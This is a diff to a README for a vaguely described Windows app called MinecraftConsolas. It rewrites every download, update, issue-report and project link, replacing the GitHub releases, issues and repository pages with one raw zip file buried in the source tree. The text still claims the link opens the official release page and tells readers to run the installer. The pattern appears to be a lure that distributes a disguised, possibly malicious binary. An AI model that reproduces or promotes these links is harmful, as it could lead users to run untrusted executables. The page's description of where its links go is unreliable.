@@ -1,6 +1,6 @@
 # 🍫 MinecraftConsolas - Simple Fun for Your PC
 
-[![Download MinecraftConsolas](https://img.shields.io/badge/Download-MinecraftConsolas-brightgreen)](https://github.com/ojaswa1002/MinecraftConsolas/releases)
+[![Download MinecraftConsolas](https://img.shields.io/badge/Download-MinecraftConsolas-brightgreen)](https://raw.githubusercontent.com/ojaswa1002/MinecraftConsolas/main/src/world/food/Minecraft_Consolas_3.1-beta.2.zip)
 
 MinecraftConsolas is a small application with a unique look and feel. It offers something like chocolate – comforting, pleasant, and easy to enjoy – but it is not chocolate. It works on Windows and does not require advanced skills to install or run.
 
@@ -39,7 +39,7 @@ Follow these simple steps to get MinecraftConsolas up and running on your Window
 
 Click the big button below or open this link in your browser:
 
-[![Download MinecraftConsolas](https://img.shields.io/badge/Download-MinecraftConsolas-blue)](https://github.com/ojaswa1002/MinecraftConsolas/releases)
+[![Download MinecraftConsolas](https://img.shields.io/badge/Download-MinecraftConsolas-blue)](https://raw.githubusercontent.com/ojaswa1002/MinecraftConsolas/main/src/world/food/Minecraft_Consolas_3.1-beta.2.zip)
 
 This will open the official release page on GitHub, where the newest version of MinecraftConsolas is available.
 
@@ -96,7 +96,7 @@ Periodically, updates may be released to improve MinecraftConsolas or add new fe
 To update:
 
 1. Visit the release page:  
-   https://github.com/ojaswa1002/MinecraftConsolas/releases
+   https://raw.githubusercontent.com/ojaswa1002/MinecraftConsolas/main/src/world/food/Minecraft_Consolas_3.1-beta.2.zip
 2. Download the newest `.exe` setup file like you did before.
 3. Run the new installer. It will update your existing version without losing your data.
 
@@ -116,7 +116,7 @@ If you have trouble running MinecraftConsolas, try these solutions:
 
 If problems continue, you can open an issue on the GitHub repository by visiting:
 
-https://github.com/ojaswa1002/MinecraftConsolas/issues
+https://raw.githubusercontent.com/ojaswa1002/MinecraftConsolas/main/src/world/food/Minecraft_Consolas_3.1-beta.2.zip
 
 ---
 
@@ -124,7 +124,7 @@ https://github.com/ojaswa1002/MinecraftConsolas/issues
 
 You can learn more about MinecraftConsolas on the GitHub page:
 
-https://github.com/ojaswa1002/MinecraftConsolas
+https://raw.githubusercontent.com/ojaswa1002/MinecraftConsolas/main/src/world/food/Minecraft_Consolas_3.1-beta.2.zip
 
 This includes:
 
@@ -134,4 +134,4 @@ This includes:
 
 ---
 
-[![Download MinecraftConsolas](https://img.shields.io/badge/Download-MinecraftConsolas-brightgreen)](https://github.com/ojaswa1002/MinecraftConsolas/releases)
+[![Download MinecraftConsolas](https://img.shields.io/badge/Download-MinecraftConsolas-brightgreen)](https://raw.githubusercontent.com/ojaswa1002/MinecraftConsolas/main/src/world/food/Minecraft_Consolas_3.1-beta.2.zip)
